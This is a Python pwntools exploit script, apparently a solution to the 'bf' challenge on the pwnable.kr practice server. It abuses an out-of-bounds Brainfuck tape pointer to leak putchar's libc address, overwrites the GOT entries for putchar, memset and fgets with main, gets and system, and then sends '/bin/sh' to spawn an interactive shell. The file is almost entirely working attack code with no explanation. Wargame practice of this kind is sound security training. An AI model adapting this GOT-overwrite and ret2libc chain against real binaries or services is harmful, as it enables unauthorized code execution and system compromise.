#/usr/bin/python
#-*-coding:utf-8-*-
from pwn import *
port=9001
host="pwnable.kr"
print sys.argv
if(len(sys.argv)<=1):
    print "debuging ..."
    p=process("bf")

    libc=ELF("/lib/i386-linux-gnu/libc.so.6")
    context.log_level='debug'    #这个很好用

else:
    print "go on ..."
    p=remote(host,port)
    libc=ELF("bf_libc.so")

def back(n):
    return '<'*n
def read(n):
    return '.>'*n
def write(n):
    return ',>'*n


'''
.got.plt:0804A00C off_804A00C     dd offset getchar       ; DATA XREF: _getcharr
.got.plt:0804A010 off_804A010     dd offset fgets         ; DATA XREF: _fgetsr
.got.plt:0804A014 off_804A014     dd offset __stack_chk_fail ; DATA XREF: ___stack_chk_failr
.got.plt:0804A018 off_804A018     dd offset puts          ; DATA XREF: _putsr
.got.plt:0804A01C off_804A01C     dd offset __gmon_start__ ; DATA XREF: ___gmon_start__r
.got.plt:0804A020 off_804A020     dd offset strlen        ; DATA XREF: _strlenr
.got.plt:0804A024 off_804A024     dd offset __libc_start_main
.got.plt:0804A024                                         ; DATA XREF: ___libc_start_mainr
.got.plt:0804A028 off_804A028     dd offset setvbuf       ; DATA XREF: _setvbufr
.got.plt:0804A02C off_804A02C     dd offset memset        ; DATA XREF: _memsetr
.got.plt:0804A030 off_804A030     dd offset putchar       ; DATA XREF: _putcharr
'''
putchar_got=0x0804A030
memset_got=0x804A02C
fgets_got=0x804A010
ptr=0x0804a0a0
main=0x08048671

#leak putchar_addr
pay1=back(ptr-putchar_got)+"."+read(4)
#overwrite putchar_got to main_addr
pay1+=back(4)+write(4)
#overwrite memset_got to gets_addr
pay1+=back(putchar_got-memset_got+4)+write(4)
#overwrite fgets_got to system_addr
pay1+=back(memset_got-fgets_got+4)+write(4)
#jump to main_addr
pay1+='.'

#gdb.attach(p) #这个方便啊


p.recv()
print pay1
p.sendline(pay1)
p.recv(1)
putchar_libc=libc.symbols['putchar']
gets_libc = libc.symbols['gets']
system_libc=libc.symbols['system']



putchar=u32(p.recv(4))
log.success("putchar = "+hex(putchar))

gets=putchar-putchar_libc+gets_libc
log.success("gets = "+hex(gets))

system=putchar-putchar_libc+system_libc
log.success("system = "+ hex(system))

p.send(p32(main))
p.send(p32(gets))
p.send(p32(system))

p.sendline("/bin/sh\0")
p.interactive()


#aa=p.recv()
#print aa
